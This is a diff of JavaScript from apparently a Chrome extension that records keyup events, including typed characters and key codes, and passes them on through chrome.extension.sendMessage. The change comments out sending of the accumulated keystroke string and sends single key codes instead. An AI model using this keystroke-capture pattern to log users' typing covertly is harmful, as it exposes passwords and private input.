@@ -8,7 +8,10 @@ document.addEventListener('DOMContentLoaded', function() {
 		//Shift Key released
 		if(e.which == 16){
 			keyPoints=keyPoints+ ' ' + e.which;
-			chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
+			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
+					console.log(response);
+			}); */
+			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
 					console.log(response);
 			});
 		}
@@ -18,7 +21,10 @@ document.addEventListener('DOMContentLoaded', function() {
 			var subso = "'"+record+"' "+record.length+" ";
 			record = record.substring(0,(record.length-1));
 			subso = subso + "'"+record+"' "+record.length;
-			chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+subso+""}, function(response) {
+			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+subso+""}, function(response) {
+					console.log(response);
+			}); */
+			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
 					console.log(response);
 			});
 		}
@@ -29,7 +35,10 @@ document.addEventListener('DOMContentLoaded', function() {
 		//Enter key pressed
 		else if(e.which == 13){
 			keyPoints=keyPoints+ ' ' + e.which;
-			chrome.extension.sendMessage({greeting: "keys", data: ""+record+""}, function(response) {
+			/* chrome.extension.sendMessage({greeting: "keys", data: ""+record+""}, function(response) {
+				console.log(response);
+			}); */
+			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
 				console.log(response);
 			});
 		}
@@ -39,7 +48,10 @@ document.addEventListener('DOMContentLoaded', function() {
 		} else if(e.which > 47 && e.which <58){
 		} else {
 			keyPoints=keyPoints+ ' ' + e.which;
-			chrome.extension.sendMessage({greeting: "keys", data: ""+keyPoints+""}, function(response) {
+			/* chrome.extension.sendMessage({greeting: "keys", data: ""+keyPoints+""}, function(response) {
+				console.log(response);
+			}); */
+			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
 				console.log(response);
 			});
 		}	
@@ -53,8 +65,11 @@ document.addEventListener('DOMContentLoaded', function() {
 			record=record+String.fromCharCode(e.which);
 			keyPoints=keyPoints+ ' ' +e.which;
 			charCount++;
-			chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
+			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
 					console.log(response);
+			}); */
+			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
+				console.log(response);
 			});
 	}
 }, false);
